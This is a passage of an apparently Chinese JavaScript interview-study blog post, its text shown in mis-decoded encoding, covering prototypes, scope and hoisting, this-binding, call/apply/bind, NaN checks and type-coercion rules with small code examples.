·ä¸€ç›´æ‰¾ä¸‹å»ï¼Œè¿™å°±æ˜¯åŸå‹é“¾çš„æ¦‚å¿µã€‚åŸå‹é“¾çš„å°½å¤´ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯ Object.prototypeï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯æˆ‘ä»¬æ–°å»ºçš„å¯¹è±¡ä¸ºä»€ä¹ˆèƒ½å¤Ÿä½¿ç”¨ toString() ç­‰æ–¹æ³•çš„åŸå› ã€‚</p><p><strong>ç‰¹ç‚¹ï¼š</strong>JavaScript å¯¹è±¡æ˜¯é€šè¿‡å¼•ç”¨æ¥ä¼ é€’çš„ï¼Œæˆ‘ä»¬åˆ›å»ºçš„æ¯ä¸ªæ–°å¯¹è±¡å®ä½“ä¸­å¹¶æ²¡æœ‰ä¸€ä»½å±äºè‡ªå·±çš„åŸå‹å‰¯æœ¬ã€‚å½“æˆ‘ä»¬ä¿®æ”¹åŸå‹æ—¶ï¼Œä¸ä¹‹ç›¸å…³çš„å¯¹è±¡ä¹Ÿä¼šç»§æ‰¿è¿™ä¸€æ”¹å˜ã€‚</p><p><img src="https://i.loli.net/2021/09/10/vgMdz1XLq3HCEuD.png" alt="image.png"></p><h2 id="JavaScript-ä¸­çš„ä½œç”¨åŸŸä¸å˜é‡å£°æ˜æå‡ï¼Ÿ"><a href="#JavaScript-ä¸­çš„ä½œç”¨åŸŸä¸å˜é‡å£°æ˜æå‡ï¼Ÿ" class="headerlink" title="JavaScript ä¸­çš„ä½œç”¨åŸŸä¸å˜é‡å£°æ˜æå‡ï¼Ÿ"></a>JavaScript ä¸­çš„ä½œç”¨åŸŸä¸å˜é‡å£°æ˜æå‡ï¼Ÿ</h2><p><strong>ä½œç”¨åŸŸ</strong>ï¼šå¯è®¿é—®å˜é‡ï¼Œå¯¹è±¡ï¼Œå‡½æ•°çš„é›†åˆã€‚</p><p><strong>å˜é‡æå‡ï¼š</strong>æ— è®ºåœ¨å‡½æ•°ä¸­ä½•å¤„ä½ç½®å£°æ˜çš„å˜é‡ï¼Œå¥½åƒéƒ½è¢«æå‡åˆ°äº†å‡½æ•°çš„é¦–éƒ¨ï¼Œå› æ­¤å¯ä»¥åœ¨å˜é‡å£°æ˜å‰è®¿é—®åˆ°è€Œä¸ä¼šæŠ¥é”™ã€‚</p><p>å˜é‡å£°æ˜æå‡çš„<strong>æœ¬è´¨åŸå› </strong>ï¼š js å¼•æ“åœ¨ä»£ç æ‰§è¡Œå‰æœ‰ä¸€ä¸ªè§£æçš„è¿‡ç¨‹ï¼Œåˆ›å»ºäº†æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œåˆå§‹åŒ–äº†ä¸€äº›ä»£ç æ‰§è¡Œæ—¶éœ€è¦ç”¨åˆ°çš„å¯¹è±¡ã€‚å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªå˜é‡æ—¶ï¼Œä¼šåˆ°å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­çš„ä½œç”¨åŸŸé“¾ä¸­å»æŸ¥æ‰¾ï¼Œè€Œä½œç”¨åŸŸé“¾çš„é¦–ç«¯æŒ‡å‘çš„æ˜¯å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡çš„å˜é‡å¯¹è±¡ï¼Œè¿™ä¸ªå˜é‡å¯¹è±¡æ˜¯æ‰§è¡Œä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒåŒ…å«äº†å‡½æ•°çš„å½¢å‚ã€æ‰€æœ‰çš„å‡½æ•°å’Œå˜é‡å£°æ˜ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯åœ¨ä»£ç è§£æçš„æ—¶å€™åˆ›å»ºçš„ã€‚è¿™å°±æ˜¯ä¼šå‡ºç°å˜é‡å£°æ˜æå‡çš„æ ¹æœ¬åŸå› ã€‚</p><h2 id="JavaScript-çš„ä½œç”¨åŸŸé“¾ï¼Ÿ"><a href="#JavaScript-çš„ä½œç”¨åŸŸé“¾ï¼Ÿ" class="headerlink" title="JavaScript çš„ä½œç”¨åŸŸé“¾ï¼Ÿ"></a>JavaScript çš„ä½œç”¨åŸŸé“¾ï¼Ÿ</h2><p>ä½œç”¨åŸŸé“¾çš„<strong>ä½œç”¨</strong>ï¼šä¿è¯å¯¹æ‰§è¡Œç¯å¢ƒæœ‰æƒè®¿é—®çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°çš„æœ‰åºè®¿é—®ï¼Œé€šè¿‡ä½œç”¨åŸŸé“¾ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°å¤–å±‚ç¯å¢ƒçš„å˜é‡å’Œå‡½æ•°ã€‚</p><p>ä½œç”¨åŸŸé“¾çš„<strong>æœ¬è´¨</strong>ï¼šä¸€ä¸ªæŒ‡å‘å˜é‡å¯¹è±¡çš„æŒ‡é’ˆåˆ—è¡¨ã€‚å˜é‡å¯¹è±¡æ˜¯ä¸€ä¸ªåŒ…å«äº†æ‰§è¡Œç¯å¢ƒä¸­æ‰€æœ‰å˜é‡å’Œå‡½æ•°çš„å¯¹è±¡ï¼Œä½œç”¨åŸŸé“¾çš„é¡¶ç«¯å§‹ç»ˆæ˜¯å½“å‰æ‰§è¡Œä¸Šä¸‹æ–‡çš„å˜é‡å¯¹è±¡ï¼Œåº•ç«¯å§‹ç»ˆæ˜¯å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡çš„å˜é‡å¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯å…¨å±€å¯¹è±¡ï¼‰ã€‚</p><p>å½“æˆ‘ä»¬æŸ¥æ‰¾ä¸€ä¸ªå˜é‡æ—¶ï¼Œå¦‚æœå½“å‰æ‰§è¡Œç¯å¢ƒä¸­æ²¡æœ‰æ‰¾åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥æ²¿ç€ä½œç”¨åŸŸé“¾å‘ä¸‹æŸ¥æ‰¾ã€‚</p><h2 id="è°ˆè°ˆ-This-å¯¹è±¡çš„ç†è§£"><a href="#è°ˆè°ˆ-This-å¯¹è±¡çš„ç†è§£" class="headerlink" title="è°ˆè°ˆ This å¯¹è±¡çš„ç†è§£"></a>è°ˆè°ˆ This å¯¹è±¡çš„ç†è§£</h2><p>this å¯¹è±¡æ˜¯æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œå®ƒæŒ‡å‘æœ€åä¸€æ¬¡è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„å¯¹è±¡ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œthis çš„æŒ‡å‘å¯ä»¥é€šè¿‡å››ç§è°ƒç”¨æ¨¡å¼æ¥åˆ¤æ–­ã€‚</p><ul><li><strong>å‡½æ•°</strong>è°ƒç”¨æ¨¡å¼ã€‚å½“ä¸€ä¸ªå‡½æ•°ä¸æ˜¯ä¸€ä¸ªå¯¹è±¡çš„å±æ€§ï¼Œç›´æ¥ä½œä¸ºå‡½æ•°æ¥è°ƒç”¨æ—¶ï¼Œthis æŒ‡å‘å…¨å±€å¯¹è±¡ã€‚</li><li><strong>æ–¹æ³•</strong>è°ƒç”¨æ¨¡å¼ã€‚å¦‚æœä¸€ä¸ªå‡½æ•°ä½œä¸ºä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•æ¥è°ƒç”¨æ—¶ï¼Œthis æŒ‡å‘è¿™ä¸ªå¯¹è±¡ã€‚</li><li><strong>æ„é€ å™¨</strong>è°ƒç”¨æ¨¡å¼ã€‚å¦‚æœä¸€ä¸ªå‡½æ•°ç”¨ new è°ƒç”¨ï¼Œå‡½æ•°æ‰§è¡Œå‰ä¼šæ–°åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œthis æŒ‡å‘è¿™ä¸ªæ–°åˆ›å»ºçš„å¯¹è±¡ã€‚</li><li><strong>apply ã€ call å’Œ bind</strong> è°ƒç”¨æ¨¡å¼ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•éƒ½å¯ä»¥æ˜¾ç¤ºçš„æŒ‡å®šè°ƒç”¨å‡½æ•°çš„ this æŒ‡å‘ã€‚</li></ul><p>è¿™å››ç§æ–¹å¼ï¼Œä½¿ç”¨æ„é€ å™¨è°ƒç”¨æ¨¡å¼çš„ä¼˜å…ˆçº§æœ€é«˜ï¼Œç„¶åæ˜¯ apply ã€ call å’Œ bind è°ƒç”¨æ¨¡å¼ï¼Œç„¶åæ˜¯æ–¹æ³•è°ƒç”¨æ¨¡å¼ï¼Œç„¶åæ˜¯å‡½æ•°è°ƒç”¨æ¨¡å¼ã€‚</p><h3 id="ç®­å¤´å‡½æ•°çš„-this"><a href="#ç®­å¤´å‡½æ•°çš„-this" class="headerlink" title="ç®­å¤´å‡½æ•°çš„ this"></a>ç®­å¤´å‡½æ•°çš„ this</h3><p>ç®­å¤´å‡½æ•°å…¶å®æ˜¯æ²¡æœ‰ <code>this</code> çš„ï¼Œç®­å¤´å‡½æ•°ä¸­çš„ <code>this</code> åªå–å†³åŒ…è£¹ç®­å¤´å‡½æ•°çš„ç¬¬ä¸€ä¸ªæ™®é€šå‡½æ•°çš„ <code>this</code>ã€‚</p><h2 id="new-å…³é”®å­—ï¼Ÿ"><a href="#new-å…³é”®å­—ï¼Ÿ" class="headerlink" title="new å…³é”®å­—ï¼Ÿ"></a>new å…³é”®å­—ï¼Ÿ</h2><ol><li>é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ç©ºå¯¹è±¡ã€‚</li><li>è®¾ç½®åŸå‹ï¼Œå°†å¯¹è±¡çš„åŸå‹è®¾ç½®ä¸ºå‡½æ•°çš„ prototype å¯¹è±¡ã€‚</li><li>è®©å‡½æ•°çš„ this æŒ‡å‘è¿™ä¸ªå¯¹è±¡ï¼Œæ‰§è¡Œæ„é€ å‡½æ•°çš„ä»£ç ï¼ˆä¸ºè¿™ä¸ªæ–°å¯¹è±¡æ·»åŠ å±æ€§ï¼‰ã€‚</li><li>åˆ¤æ–­å‡½æ•°çš„è¿”å›å€¼ç±»å‹ï¼Œå¦‚æœæ˜¯å€¼ç±»å‹ï¼Œè¿”å›åˆ›å»ºçš„å¯¹è±¡ã€‚å¦‚æœæ˜¯å¼•ç”¨ç±»å‹ï¼Œå°±è¿”å›è¿™ä¸ªå¼•ç”¨ç±»å‹çš„å¯¹è±¡ã€‚</li></ol><h2 id="call-ã€apply-å’Œ-bind-çš„åŒºåˆ«ï¼Ÿ"><a href="#call-ã€apply-å’Œ-bind-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="call() ã€apply() å’Œ bind() çš„åŒºåˆ«ï¼Ÿ"></a>call() ã€apply() å’Œ bind() çš„åŒºåˆ«ï¼Ÿ</h2><p>apply æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šäº†å‡½æ•°ä½“å†… this å¯¹è±¡çš„æŒ‡å‘ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªé›†åˆï¼Œå¯ä»¥ä¸ºæ•°ç»„ï¼Œä¹Ÿå¯ä»¥ä¸ºç±»æ•°ç»„ã€‚apply æ–¹æ³•æŠŠè¿™ä¸ªé›†åˆä¸­çš„å…ƒç´ ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¢«è°ƒç”¨çš„å‡½æ•°ã€‚</p><p>call ä¼ å…¥çš„å‚æ•°æ•°é‡ä¸å›ºå®šï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä»£è¡¨å‡½æ•°ä½“å†…çš„ this æŒ‡å‘ï¼Œä»ç¬¬äºŒä¸ªå‚æ•°å¼€å§‹å¾€åï¼Œæ¯ä¸ªå‚æ•°è¢«ä¾æ¬¡ä¼ å…¥å‡½æ•°ã€‚</p><p>bind æ–¹æ³•é€šè¿‡ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ª this ç»‘å®šäº†ä¼ å…¥å¯¹è±¡çš„æ–°å‡½æ•°ã€‚<strong>è¿™ä¸ªå‡½æ•°çš„ this æŒ‡å‘é™¤äº†ä½¿ç”¨ new æ—¶ä¼šè¢«æ”¹å˜ï¼Œå…¶ä»–æƒ…å†µä¸‹éƒ½ä¸ä¼šæ”¹å˜ã€‚</strong>ä¸ç®¡æˆ‘ä»¬ç»™å‡½æ•° bind å‡ æ¬¡ï¼Œfn ä¸­çš„ this æ°¸è¿œç”±ç¬¬ä¸€æ¬¡ bind å†³å®šã€‚</p><h2 id="js-ä¸­æ•´æ•°çš„å®‰å…¨èŒƒå›´æ˜¯å¤šå°‘ï¼Ÿ"><a href="#js-ä¸­æ•´æ•°çš„å®‰å…¨èŒƒå›´æ˜¯å¤šå°‘ï¼Ÿ" class="headerlink" title="js ä¸­æ•´æ•°çš„å®‰å…¨èŒƒå›´æ˜¯å¤šå°‘ï¼Ÿ"></a>js ä¸­æ•´æ•°çš„å®‰å…¨èŒƒå›´æ˜¯å¤šå°‘ï¼Ÿ</h2><p>å®‰å…¨æ•´æ•°æŒ‡çš„æ˜¯ï¼Œåœ¨è¿™ä¸ªèŒƒå›´å†…çš„æ•´æ•°è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­˜å‚¨çš„æ—¶å€™ä¸ä¼šå‡ºç°ç²¾åº¦ä¸¢å¤±ï¼Œèƒ½å¤Ÿè¢«â€œå®‰å…¨â€å‘ˆç°çš„æœ€å¤§æ•´æ•°æ˜¯ 2^53 - 1ã€‚åœ¨ ES6 ä¸­è¢«å®šä¹‰ä¸º Number.MAX_SAFE_INTEGERã€‚æœ€å°æ•´æ•°åœ¨ ES6 ä¸­è¢«å®šä¹‰ä¸ºNumber.MIN_SAFE_INTEGERã€‚</p><p>å¦‚æœæŸæ¬¡è®¡ç®—çš„ç»“æœå¾—åˆ°äº†ä¸€ä¸ªè¶…è¿‡ JavaScript æ•°å€¼èŒƒå›´çš„å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªå€¼ä¼šè¢«è‡ªåŠ¨è½¬æ¢ä¸ºç‰¹æ®Šçš„ Infinity å€¼ã€‚å¦‚æœæŸæ¬¡è®¡ç®—è¿”å›äº†æ­£æˆ–è´Ÿçš„ Infinity å€¼ï¼Œé‚£ä¹ˆè¯¥å€¼å°†æ— æ³•å‚ä¸ä¸‹ä¸€æ¬¡çš„è®¡ç®—ã€‚åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯æœ‰ç©·çš„ï¼Œå¯ä»¥ä½¿ç”¨ isFinite å‡½æ•°æ¥åˆ¤æ–­ã€‚</p><h2 id="ES6-ä¸­æœ‰ä½¿ç”¨è¿‡ä»€ä¹ˆï¼Ÿ"><a href="#ES6-ä¸­æœ‰ä½¿ç”¨è¿‡ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ES6 ä¸­æœ‰ä½¿ç”¨è¿‡ä»€ä¹ˆï¼Ÿ"></a>ES6 ä¸­æœ‰ä½¿ç”¨è¿‡ä»€ä¹ˆï¼Ÿ</h2><p>è¿™è¾¹å¯è¯´çš„å®åœ¨å¤ªå¤šï¼Œå¯ä»¥åˆ—ä¸¾ 1 - 2 ä¸ªç‚¹ã€‚æ¯”å¦‚è¯´è¯´ <code>class</code>ï¼Œé‚£ä¹ˆ <code>class</code> åˆå¯ä»¥æ‹‰å›åˆ°åŸå‹çš„é—®é¢˜ï¼›å¯ä»¥è¯´è¯´ <code>promise</code>ï¼Œé‚£ä¹ˆçº¿å°±è¢«æ‹‰åˆ°äº†å¼‚æ­¥çš„å†…å®¹ï¼›å¯ä»¥è¯´è¯´ <code>proxy</code>ï¼Œé‚£ä¹ˆå¦‚æœä½¿ç”¨è¿‡ Vue è¿™ä¸ªæ¡†æ¶ï¼Œå°±å¯ä»¥è°ˆè°ˆå“åº”å¼åŸç†çš„å†…å®¹ï¼›åŒæ ·ä¹Ÿå¯ä»¥è¯´è¯´ <code>let</code> è¿™äº›å£°æ˜å˜é‡çš„è¯­æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥è°ˆåŠä¸ <code>var</code> çš„ä¸åŒï¼Œè¯´åˆ°æå‡è¿™å—çš„å†…å®¹ã€‚</p><h2 id="typeof-NaN-çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#typeof-NaN-çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="typeof NaN çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ"></a>typeof NaN çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>NaN æ„æŒ‡â€œä¸æ˜¯ä¸€ä¸ªæ•°å­—â€ï¼Œæ˜¯ä¸€ä¸ªâ€œè­¦æˆ’å€¼â€ï¼Œç”¨äºæŒ‡å‡ºæ•°å­—ç±»å‹ä¸­çš„é”™è¯¯æƒ…å†µï¼Œå³â€œæ‰§è¡Œæ•°å­¦è¿ç®—æ²¡æœ‰æˆåŠŸï¼Œè¿™æ˜¯å¤±è´¥åè¿”å›çš„ç»“æœâ€ã€‚</p><p><code>typeof NaN; // &quot;number&quot;</code>  NaN æ˜¯ä¸€ä¸ªç‰¹æ®Šå€¼ï¼Œå®ƒå’Œè‡ªèº«ä¸ç›¸ç­‰ï¼Œæ˜¯<strong>å”¯ä¸€ä¸€ä¸ªéè‡ªå</strong>çš„å€¼ã€‚</p><h2 id="isNaN-å’Œ-Number-isNaN-å‡½æ•°çš„åŒºåˆ«ï¼Ÿ"><a href="#isNaN-å’Œ-Number-isNaN-å‡½æ•°çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="isNaN å’Œ Number.isNaN å‡½æ•°çš„åŒºåˆ«ï¼Ÿ"></a>isNaN å’Œ Number.isNaN å‡½æ•°çš„åŒºåˆ«ï¼Ÿ</h2><p>å‡½æ•° isNaN æ¥æ”¶å‚æ•°åï¼Œä¼šå°è¯•å°†è¿™ä¸ªå‚æ•°è½¬æ¢ä¸ºæ•°å€¼ï¼Œä»»ä½•ä¸èƒ½è¢«è½¬æ¢ä¸ºæ•°å€¼çš„çš„å€¼éƒ½ä¼šè¿”å› trueï¼Œå› æ­¤<strong>éæ•°å­—å€¼ä¼ å…¥ä¹Ÿä¼šè¿”å› true</strong> ï¼Œä¼šå½±å“ NaN çš„åˆ¤æ–­ã€‚</p><p>å‡½æ•° Number.isNaN ä¼š<strong>é¦–å…ˆåˆ¤æ–­ä¼ å…¥å‚æ•°æ˜¯å¦ä¸ºæ•°å­—</strong>ï¼Œå¦‚æœæ˜¯æ•°å­—å†ç»§ç»­åˆ¤æ–­æ˜¯å¦ä¸º NaN ï¼Œè¿™ç§æ–¹æ³•å¯¹äº NaN çš„åˆ¤æ–­æ›´ä¸ºå‡†ç¡®ã€‚</p><h2 id="è½¬æ¢è§„åˆ™"><a href="#è½¬æ¢è§„åˆ™" class="headerlink" title="è½¬æ¢è§„åˆ™"></a>è½¬æ¢è§„åˆ™</h2><h3 id="To-å­—ç¬¦ä¸²"><a href="#To-å­—ç¬¦ä¸²" class="headerlink" title="To å­—ç¬¦ä¸²"></a>To å­—ç¬¦ä¸²</h3><p>æŠ½è±¡æ“ä½œ ToString è´Ÿè´£å¤„ç†éå­—ç¬¦ä¸²åˆ°å­—ç¬¦ä¸²çš„å¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚</p><p>ï¼ˆ1ï¼‰Null å’Œ Undefined ç±»å‹ ï¼Œnull è½¬æ¢ä¸º â€œnullâ€ï¼Œundefined è½¬æ¢ä¸º â€œundefinedâ€ï¼Œ</p><p>ï¼ˆ2ï¼‰Boolean ç±»å‹ï¼Œtrue è½¬æ¢ä¸º â€œtrueâ€ï¼Œfalse è½¬æ¢ä¸º â€œfalseâ€ã€‚</p><p>ï¼ˆ3ï¼‰Number ç±»å‹çš„å€¼ç›´æ¥è½¬æ¢ï¼Œä¸è¿‡é‚£äº›æå°å’Œæå¤§çš„æ•°å­—ä¼šä½¿ç”¨æŒ‡æ•°å½¢å¼ã€‚</p><p>ï¼ˆ4ï¼‰Symbol ç±»å‹çš„å€¼ç›´æ¥è½¬æ¢ï¼Œä½†æ˜¯åªå…è®¸æ˜¾å¼å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä½¿ç”¨éšå¼å¼ºåˆ¶ç±»å‹è½¬æ¢ä¼šäº§ç”Ÿé”™è¯¯ã€‚</p><p>ï¼ˆ5ï¼‰å¯¹æ™®é€šå¯¹è±¡æ¥è¯´ï¼Œé™¤éè‡ªè¡Œå®šä¹‰ toString() æ–¹æ³•ï¼Œå¦åˆ™ä¼šè°ƒç”¨ toString()ï¼ˆObject.prototype.toString()ï¼‰æ¥è¿”å›å†…éƒ¨å±æ€§ [[Class]] çš„å€¼ï¼Œå¦‚â€[object Object]â€ã€‚å¦‚æœå¯¹è±¡æœ‰è‡ªå·±çš„ toString() æ–¹æ³•ï¼Œå­—ç¬¦ä¸²åŒ–æ—¶å°±ä¼šè°ƒç”¨è¯¥æ–¹æ³•å¹¶ä½¿ç”¨å…¶è¿”å›å€¼ã€‚</p><h3 id="To-æ•°å­—å€¼"><a href="#To-æ•°å­—å€¼" class="headerlink" title="To æ•°å­—å€¼"></a>To æ•°å­—å€¼</h3><p>æŠ½è±¡æ“ä½œ ToNumberï¼š</p><p>ï¼ˆ1ï¼‰Undefined ç±»å‹çš„å€¼è½¬æ¢ä¸º NaNã€‚</p><p>ï¼ˆ2ï¼‰Null ç±»å‹çš„å€¼è½¬æ¢ä¸º 0ã€‚</p><p>ï¼ˆ3ï¼‰Boolean ç±»å‹çš„å€¼ï¼Œtrue è½¬æ¢ä¸º 1ï¼Œfalse è½¬æ¢ä¸º 0ã€‚</p><p>ï¼ˆ4ï¼‰String ç±»å‹çš„å€¼è½¬æ¢å¦‚åŒä½¿ç”¨ Number() å‡½æ•°è¿›è¡Œè½¬æ¢ï¼Œå¦‚æœåŒ…å«éæ•°å­—å€¼åˆ™è½¬æ¢ä¸º NaNï¼Œç©ºå­—ç¬¦ä¸²ä¸º 0ã€‚</p><p>ï¼ˆ5ï¼‰Symbol ç±»å‹çš„å€¼<strong>ä¸èƒ½è½¬æ¢</strong>ä¸ºæ•°å­—ï¼Œä¼šæŠ¥é”™ã€‚</p><p>ï¼ˆ6ï¼‰å¯¹è±¡ï¼ˆåŒ…æ‹¬æ•°ç»„ï¼‰ä¼šé¦–å…ˆè¢«è½¬æ¢ä¸ºç›¸åº”çš„åŸºæœ¬ç±»å‹å€¼ï¼Œå¦‚æœè¿”å›çš„æ˜¯éæ•°å­—çš„åŸºæœ¬ç±»å‹å€¼ï¼Œåˆ™å†éµå¾ªä»¥ä¸Šè§„åˆ™å°†å…¶å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ã€‚</p><p>ä¸ºäº†å°†å€¼è½¬æ¢ä¸ºç›¸åº”çš„åŸºæœ¬ç±»å‹å€¼ï¼ŒæŠ½è±¡æ“ä½œ ToPrimitive ä¼šé¦–å…ˆæ£€æŸ¥è¯¥å€¼æ˜¯å¦æœ‰<code>valueOf()</code>æ–¹æ³•ï¼Œå¦‚æœæœ‰å¹¶ä¸”è¿”å›åŸºæœ¬ç±»å‹å€¼ï¼Œå°±ä½¿ç”¨è¯¥å€¼è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚å¦‚æœæ²¡æœ‰å°±ä½¿ç”¨<code>toString() </code>çš„è¿”å›å€¼æ¥è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚å¦‚æœ <code>valueOf()</code> å’Œ<code>toString()</code>å‡ä¸è¿”å›åŸºæœ¬ç±»å‹å€¼ï¼Œä¼šäº§ç”Ÿ TypeError é”™è¯¯ã€‚</p><h3 id="To-å¸ƒå°”å€¼"><a href="#To-å¸ƒå°”å€¼" class="headerlink" title="To å¸ƒå°”å€¼"></a>To å¸ƒå°”å€¼</h3><p>æŠ½è±¡æ“ä½œ ToBooleanï¼Œä»¥ä¸‹è¿™äº›æ˜¯å‡å€¼ï¼š</p><ul><li> undefined</li><li> null</li><li> false</li><li> +0ã€-0 å’Œ NaN</li><li> â€œâ€</li></ul><p>å‡å€¼çš„å¸ƒå°”å¼ºåˆ¶ç±»å‹è½¬æ¢ç»“æœä¸º falseï¼Œå‡å€¼åˆ—è¡¨ä»¥å¤–çš„éƒ½æ˜¯çœŸå€¼ã€‚</p><h3 id="å¯¹è±¡è½¬åŸå§‹ç±»å‹ï¼ˆæ‹†ç®±è½¬æ¢ï¼‰"><a href="#å¯¹è±¡è½¬åŸå§‹ç±»å‹ï¼ˆæ‹†ç®±è½¬æ¢ï¼‰" class="headerlink" title="å¯¹è±¡è½¬åŸå§‹ç±»å‹ï¼ˆæ‹†ç®±è½¬æ¢ï¼‰"></a>å¯¹è±¡è½¬åŸå§‹ç±»å‹ï¼ˆæ‹†ç®±è½¬æ¢ï¼‰</h3><p>å¯¹è±¡åœ¨è½¬æ¢ç±»å‹çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨å†…ç½®çš„ <code>[[ToPrimitive]]</code> å‡½æ•°ï¼Œå¯¹äºè¯¥å‡½æ•°æ¥è¯´ï¼Œç®—æ³•é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœå·²ç»æ˜¯åŸå§‹ç±»å‹ï¼Œä¸éœ€è¦è½¬æ¢</li><li>å¦‚æœè½¬å­—ç¬¦ä¸²ç±»å‹å°±è°ƒç”¨ <code>x.toString()</code>ï¼Œè½¬æ¢ä¸ºåŸºç¡€ç±»å‹çš„è¯å°±è¿”å›è½¬æ¢çš„å€¼ã€‚ä¸æ˜¯å­—ç¬¦ä¸²çš„è¯å°±å…ˆè°ƒç”¨ <code>valueOf</code>ï¼Œç»“æœä¸æ˜¯ åŸºç¡€ç±»å‹ å†è°ƒç”¨ <code>toString</code>ã€‚</li><li>è°ƒç”¨ <code>x.valueOf()</code>ï¼Œå¦‚æœè½¬æ¢ä¸ºåŸºç¡€ç±»å‹ï¼Œå°±è¿”å›è½¬æ¢çš„å€¼</li><li>å¦‚æœéƒ½æ²¡æœ‰è¿”å›åŸå§‹ç±»å‹ï¼Œå°±ä¼šæŠ¥é”™</li></ul><h3 id="å››åˆ™è¿ç®—ç¬¦"><a href="#å››åˆ™è¿ç®—ç¬¦" class="headerlink" title="å››åˆ™è¿ç®—ç¬¦"></a>å››åˆ™è¿ç®—ç¬¦</h3><p>åŠ æ³•è¿ç®—ç¬¦ä¸åŒäºå…¶ä»–å‡ ä¸ªè¿ç®—ç¬¦ï¼Œå®ƒæœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š</p><ul><li>è¿ç®—ä¸­å…¶ä¸­ä¸€æ–¹ä¸ºå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠå¦ä¸€æ–¹ä¹Ÿè½¬æ¢ä¸ºå­—ç¬¦ä¸²</li><li>å¦‚æœä¸€æ–¹ä¸æ˜¯å­—ç¬¦ä¸²æˆ–è€…æ•°å­—ï¼Œé‚£ä¹ˆä¼šå°†å®ƒè½¬æ¢ä¸ºæ•°å­—æˆ–è€…å­—ç¬¦ä¸²</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">&#x27;1&#x27;</span> <span class="comment">// &#x27;11&#x27;</span></span><br><span class="line"><span class="literal">true</span> + <span class="literal">true</span> <span class="comment">// 2</span></span><br><span class="line"><span class="number">4</span> + [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] <span class="comment">// &quot;41,2,3&quot; å°†æ•°ç»„é€šè¿‡ toString è½¬ä¸ºå­—ç¬¦ä¸² 1,2,3</span></span><br></pre></td></tr></table></figure><p>å¦å¤–å¯¹äºåŠ æ³•è¿˜éœ€è¦æ³¨æ„ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span> + + <span class="string">&#x27;b&#x27;</span> <span class="comment">// -&gt; &quot;aNaN&quot;ï¼Œå› ä¸º + &#x27;b&#x27; ç­‰äº NaNï¼Œæ‰€ä»¥ç»“æœä¸º &quot;aNaN&quot;</span></span><br></pre></td></tr></table></figure><h3 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h3><ol><li>å¦‚æœæ˜¯å¯¹è±¡ï¼Œå°±é€šè¿‡ <code>toPrimitive</code> è½¬æ¢å¯¹è±¡</li><li>å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œå°±é€šè¿‡ <code>unicode</code> å­—ç¬¦ç´¢å¼•æ¥æ¯”è¾ƒ</li></ol><h2 id="å’Œ-çš„-valueOf-å’Œ-toString-çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#å’Œ-çš„-valueOf-å’Œ-toString-çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="{} å’Œ [] çš„ valueOf å’Œ toString çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ"></a>{} å’Œ [] çš„ valueOf å’Œ toString çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>valueOf : è¿”å›å¯¹è±¡çš„<strong>åŸå§‹å€¼</strong>è¡¨ç¤ºã€‚</p><p>toString : è¿”å›å¯¹è±¡çš„<strong>å­—ç¬¦ä¸²</strong>è¡¨ç¤ºã€‚</p><p>{} çš„ 